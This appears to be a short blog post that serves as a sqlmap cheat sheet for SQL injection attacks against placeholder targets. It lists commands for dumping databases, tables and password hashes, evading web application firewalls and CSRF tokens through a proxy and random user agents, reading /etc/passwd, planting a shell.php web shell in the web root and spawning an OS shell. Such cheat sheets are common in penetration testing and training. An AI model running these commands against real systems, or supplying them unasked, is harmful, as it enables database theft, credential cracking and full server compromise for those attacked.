---
layout: post
title: Sqlmap
date: '2023-11-16 14:47:19 +0300'
---

## Passing an HTTP request file to SQLMap
```bash
sqlmap -r req.txt
```

## 	Specifying a cookie header
```bash
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

## Specifying a PUT request
```bash
sqlmap -u www.target.com --data='id=1' --method PUT
```

## Store traffic to an output file
```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

## Specify verbosity level
```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

## Specifying a prefix or suffix
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

## Specifying the level and risk
```bash
sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

## Basic DB enumeration
```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

## Table enumeration
```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

## Table/row enumeration
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

## Conditional enumeration
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

## Database schema enumeration
```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

## Searching for data
```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

## Password enumeration and cracking
```bash
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

## Bypassing Web Application Protections
```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
--proxy="socks4://177.39.187.70:33283"
--skip-waf
--random-agent
```

## List all tamper scripts
```bash
sqlmap --list-tampers
```

## Check for DBA privileges
```bash
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

## Reading a local file
```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

## Writing a file
```bash
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

## Spawning an OS shell
```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```